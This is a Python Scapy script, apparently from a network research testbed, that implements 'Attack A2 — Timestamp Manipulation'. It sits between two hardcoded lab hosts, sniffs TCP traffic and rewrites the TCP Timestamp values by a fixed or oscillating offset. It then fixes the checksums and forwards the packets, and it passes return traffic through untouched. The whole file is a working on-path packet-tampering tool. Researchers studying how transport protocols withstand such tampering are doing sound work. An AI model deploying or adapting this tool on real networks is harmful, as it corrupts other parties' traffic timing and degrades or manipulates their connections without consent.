#!/usr/bin/env python3

import argparse
import math
import random
import signal
import sys
import time
from scapy.all import IP, TCP, sendp, sniff, Raw, Ether, conf

stats = {
    "total_packets": 0,
    "manipulated": 0,
    "forwarded_clean": 0,
    "non_tcp": 0,
    "start_time": 0,
}
args = None
running = True


def signal_handler(sig, frame):
    global running
    running = False
    print("\n[A2] Stopping...")


def get_offset(packet_num):
    if args.mode == "fixed":
        return args.offset

    elif args.mode == "oscillating":
        elapsed = time.time() - stats["start_time"]
        phase = (elapsed / args.osc_period) * 2 * math.pi
        return int(args.offset * (0.5 + 0.5 * math.sin(phase)))

    return args.offset


def should_manipulate():
    if args.fraction >= 1.0:
        return True
    return random.random() < args.fraction


def manipulate_and_forward(pkt):
    global stats

    if not running:
        return

    stats["total_packets"] += 1

    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        stats["non_tcp"] += 1
        sendp(pkt, iface=args.iface_out, verbose=False)
        return

    if pkt[IP].src != "10.0.1.1" or pkt[IP].dst != "10.0.2.100":
        stats["forwarded_clean"] += 1
        sendp(pkt, iface=args.iface_out, verbose=False)
        return

    if not should_manipulate():
        stats["forwarded_clean"] += 1
        sendp(pkt, iface=args.iface_out, verbose=False)
        return

    modified = False
    new_options = []
    for name, val in pkt[TCP].options:
        if name == "Timestamp":
            tsval, tsecr = val
            offset = get_offset(stats["total_packets"])
            new_tsval = tsval - offset
            if new_tsval < 0:
                new_tsval = 0
            new_options.append(("Timestamp", (new_tsval, tsecr)))
            modified = True
        else:
            new_options.append((name, val))

    if modified:
        pkt[TCP].options = new_options
        del pkt[IP].chksum
        del pkt[TCP].chksum
        if pkt.haslayer(IP):
            del pkt[IP].len
        stats["manipulated"] += 1
    else:
        stats["forwarded_clean"] += 1

    sendp(pkt, iface=args.iface_out, verbose=False)

    if stats["total_packets"] % 500 == 0:
        elapsed = time.time() - stats["start_time"]
        print(f"[A2] {elapsed:.0f}s | "
              f"total={stats['total_packets']} "
              f"manipulated={stats['manipulated']} "
              f"clean={stats['forwarded_clean']}")


def forward_return_path(pkt):
    """Forward return-path packets (Host R → Host S) unmodified."""
    sendp(pkt, iface=args.iface_in, verbose=False)


def main():
    global args, stats

    parser = argparse.ArgumentParser(description="A2: Timestamp Manipulation Attack")
    parser.add_argument("--offset", type=int, required=True,
                        help="Timestamp offset in clock ticks (e.g., 500 ≈ 50ms at 10kHz)")
    parser.add_argument("--iface-in", required=True,
                        help="Interface facing Host S (e.g., en8)")
    parser.add_argument("--iface-out", required=True,
                        help="Interface facing Router/Host R (e.g., en9)")
    parser.add_argument("--fraction", type=float, default=1.0,
                        help="Fraction of packets to manipulate (0.0-1.0, default: 1.0)")
    parser.add_argument("--mode", choices=["fixed", "oscillating"], default="fixed",
                        help="Offset mode: fixed or oscillating (default: fixed)")
    parser.add_argument("--osc-period", type=float, default=5.0,
                        help="Oscillation period in seconds (default: 5.0)")
    parser.add_argument("--duration", type=int, default=0,
                        help="Duration in seconds (0 = run until Ctrl+C)")
    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    print("=============================================")
    print(" Attack A2 — Timestamp Manipulation")
    print(f" Offset: {args.offset} ticks")
    print(f" Mode: {args.mode}")
    print(f" Fraction: {args.fraction:.0%}")
    if args.mode == "oscillating":
        print(f" Oscillation period: {args.osc_period}s")
    if args.duration > 0:
        print(f" Duration: {args.duration}s")
    print(f" Sniffing: {args.iface_in}")
    print(f" Forwarding to: {args.iface_out}")
    print("=============================================")
    print("")

    stats["start_time"] = time.time()

    import threading
    return_thread = threading.Thread(
        target=lambda: sniff(
            iface=args.iface_out,
            filter="src host 10.0.2.100 and dst host 10.0.1.1 and tcp",
            prn=forward_return_path,
            store=False,
            stop_filter=lambda _: not running,
        ),
        daemon=True,
    )
    return_thread.start()

    sniff_kwargs = {
        "iface": args.iface_in,
        "filter": "src host 10.0.1.1 and dst host 10.0.2.100 and tcp",
        "prn": manipulate_and_forward,
        "store": False,
        "stop_filter": lambda _: not running,
    }

    if args.duration > 0:
        sniff_kwargs["timeout"] = args.duration

    sniff(**sniff_kwargs)

    elapsed = time.time() - stats["start_time"]
    print("")
    print("=============================================")
    print(f" A2 Complete — {elapsed:.1f}s")
    print(f" Total packets: {stats['total_packets']}")
    print(f" Manipulated: {stats['manipulated']}")
    print(f" Forwarded clean: {stats['forwarded_clean']}")
    if stats["total_packets"] > 0:
        print(f" Manipulation rate: {stats['manipulated']/stats['total_packets']:.1%}")
    print("=============================================")


if __name__ == "__main__":
    main()
